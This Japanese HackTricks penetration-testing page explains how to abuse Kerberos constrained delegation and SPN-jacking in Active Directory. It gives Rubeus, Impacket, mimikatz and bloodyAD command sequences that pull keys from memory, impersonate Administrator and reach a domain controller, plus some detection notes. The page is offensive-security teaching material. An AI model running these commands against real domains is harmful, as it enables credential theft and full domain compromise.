# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

これを使用すると、Domain admin は、コンピューターが任意のユーザーまたはコンピューターになりすまして、あるマシン上の任意の**service**に対してアクセスすることを**許可**できます。

- **Service for User to self (_S4U2self_):** **SPN**を所有する任意の**service account**は、通常、任意のユーザーに代わって自身へのTGSを取得できます。そのアカウントの _userAccountControl_ に [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) も設定されている場合、そのTGSは**forwardable**になります。これにより、protocol transition が **classic constrained delegation** に直接利用できるようになります。
- **Service for User to Proxy(_S4U2proxy_):** **service account**は、**msDS-AllowedToDelegateTo**に一覧表示されたSPNに対して、ユーザーに代わってTGSを取得できます。S4U2Proxyで使用される証拠チケットは、delegating serviceへの**forwardable**チケットでなければなりません。これは、victimから取得した実際のclient-to-serviceチケット、または **S4U2Self + T2A4D** で生成したチケットのいずれかです。

**Note**: ADでユーザーに ‘_Account is sensitive and cannot be delegated_’ が設定されている場合、またはそのユーザーが **Protected Users** のメンバーである場合、通常、constrained delegationを通じてそのユーザーになりすますことは**できません**。modern domainでdelegationが有効なアカウントを対象にする場合は、RC4のみを前提とせず、**AES** materialを優先してください。

つまり、**serviceのhashをcompromise**できれば、ユーザーになりすまし、指定されたマシン上の任意の**service**に対して、そのユーザーに代わって**access**を取得できます（**privesc**の可能性があります）。

さらに、ユーザーがなりすませる**service**だけでなく、**任意のservice**にもアクセスできます。これは、SPN（要求されたservice name）がチェックされていないためです（チケット内では、この部分はencrypted/signedされていません）。したがって、**CIFS service**へのアクセス権がある場合、たとえばRubeusの`/altservice` flagを使用して、**HOST service**にもアクセスできます。同じSPN swappingのweaknessは、**Impacket getST -altservice**やその他のtoolingでも悪用されます。

また、DC上の**LDAP service access**は、**DCSync**をexploitするために必要なものです。
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operator note:** **gMSA/sMSA** のレビューでは、**ADUC** や BloodHound のスクリーンショットだけを信頼しないでください。これらのアカウントでは通常の Delegation タブが表示されないことが多いため、生の **`userAccountControl`** 属性と **`msDS-AllowedToDelegateTo`** 属性を直接列挙してください。
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition と Kerberos-only constrained delegation

侵害されたアカウントに **T2A4D** がある場合、通常はサービスキー/TGT だけで完全な **`S4U2Self -> S4U2Proxy`** chain を完了できます。<sup>[[2]](#references)</sup>

**`msDS-AllowedToDelegateTo`** しかない場合（classic **"Use Kerberos only"** mode）、delegation は引き続き悪用できますが、S4U2Proxy の evidence ticket は、delegating service 宛ての**実際の forwardable user-to-service ticket**でなければなりません。実際には、victim TGS を **LSASS/ccache** から盗むか取得し、それを second stage（Rubeus の `/tgs:`）に渡す必要があります。**non-forwardable** な S4U2Self ticket は classic constrained delegation には不十分です。それが唯一の evidence ticket である場合は、代わりに [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) を確認してください。<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notes (2025+)

**Windows Server 2012/2012 R2** 以降、KDC は S4U2Proxy extensions を介した domains/forests 間の **constrained delegation** をサポートしています。Modern builds（Windows Server 2016–2025）ではこの動作が維持され、protocol transition を示す 2 つの PAC SID が追加されています。<sup>[[1]](#references)</sup>

- `S-1-18-1`（**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**）：user が通常どおり authenticated された場合。
- `S-1-18-2`（**SERVICE_ASSERTED_IDENTITY**）：service が protocol transition を通じて identity を asserted した場合。

domains 間で protocol transition が使用された場合、PAC 内に `SERVICE_ASSERTED_IDENTITY` が存在することを想定してください。これは S4U2Proxy step が成功したことを確認するものです。<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket（0.11.x+）では、Rubeus と同じ S4U chain および SPN swapping が利用できます。<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
ユーザーの ST を先に forging する場合（例: オフライン hash しかない場合）は、S4U2Proxy 用に **ticketer.py** と **getST.py** を組み合わせます。すでに動作する ccache があり、同じホストの service class だけを交換したい場合は、`tgssub.py` も便利です。現在の挙動上の注意点（forged ST が SPN key と一致しない場合の KRB_AP_ERR_MODIFIED）については、公開されている Impacket issue #1713 を参照してください。<sup>[[2]](#references)</sup>

### SPN-jacking: constrained-delegation target のリダイレクト

Classic constrained delegation は、不変の target SID ではなく、`msDS-AllowedToDelegateTo` 内の **SPN string** を認可します。S4U2Proxy の実行中、KDC はその時点でその SPN を所有している account を解決し、その account の long-term key を使って service ticket を暗号化します。したがって、delegating account を制御し、別の service/computer account に対する `WriteSPN` を持っていれば、`SeEnableDelegationPrivilege` なしで、変更されていない delegation constraint のリダイレクトが可能です。<sup>[[5]](#references)[[6]](#references)</sup>

2 つの variant があります。<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** 許可された SPN が、以前の owner の削除、rename、または SPN の削除によって orphaned になっている場合です。目的の target account に直接追加します。
- **Live SPN-jacking:** SPN がまだ source account に属している場合です。Duplicate-SPN validation により通常は destination への書き込みがブロックされるため、両方の object に対する `WriteSPN` が必要です。source から削除し、target に追加して ticket を取得し、その後、元の registration を復元します。

以下の抽象化された Linux flow では、許可された SPN を移動し、compromised delegating principal として S4U を実行し、ticket の service name を新しい target 上の有用な service に書き換えます。<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` は、2つ目の独立したプリミティブです。S4U2Proxy ticket は、現在 `$DELEGATED_SPN` を所有しているアカウント向けに暗号化されています。ticket service name（`sname`）は暗号化された ticket body の外部にあるため、tooling は、同じアカウントキーを使用する別の service class/hostname に置き換えられます。SPN-jacking はまず、ticket を保護する **アカウントキー** を変更し、service-class substitution はその ticket を **どこに提示するか** を変更します。<sup>[[5]](#references)[[6]](#references)</sup>

Live jacking の場合は、正規の service を壊さないよう、ticket acquisition の直後に2つの LDAP write を元に戻します。computer-account auditing が有効な DC では、ある computer から `servicePrincipalName` が削除され、その直後に別の computer へ追加されている Security event **4742** を探します。特に、SPN hostname が宛先の `dNSHostName` と異なる場合が重要です。event **4769** と相関させます。S4U2Self では client と service に同じアカウントが設定され、S4U2Proxy では **Transited Services** が設定されます。<sup>[[5]](#references)</sup>

### 低権限 creds から delegation setup を自動化する

computer または service account に対する **GenericAll/WriteDACL** をすでに持っている場合、**bloodyAD**（2024+）を使用すると、RSAT なしで必要な attributes をリモートから設定できます：
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
これにより、これらの属性に書き込み可能になった時点で、DA privileges なしに privesc 用の constrained delegation path を構築できます。

- Step 1: **許可されたサービスの TGT を取得**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> **Printer Bug**や**unconstrained delegation**、**NTLM relaying**、**Active Directory Certificate Service abuse**など、コンピューター上でSYSTEMにならずに**TGTチケット**や**RC4**、**AES256**を取得する方法はほかにもあります。
>
> **そのTGTチケット（またはハッシュ）があるだけで、コンピューター全体を侵害せずにこの攻撃を実行できます。**

- Step2: **ユーザーになりすましてサービス用のTGSを取得する**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.teamに詳しい情報があります。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) and [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegationの概要 (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [ImpacketによるDelegationの悪用 (Part 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [KerberosityがDomainを滅ぼした: Offensive Kerberosの概要 (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: WriteSPN Abuseにおける特殊なケース](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
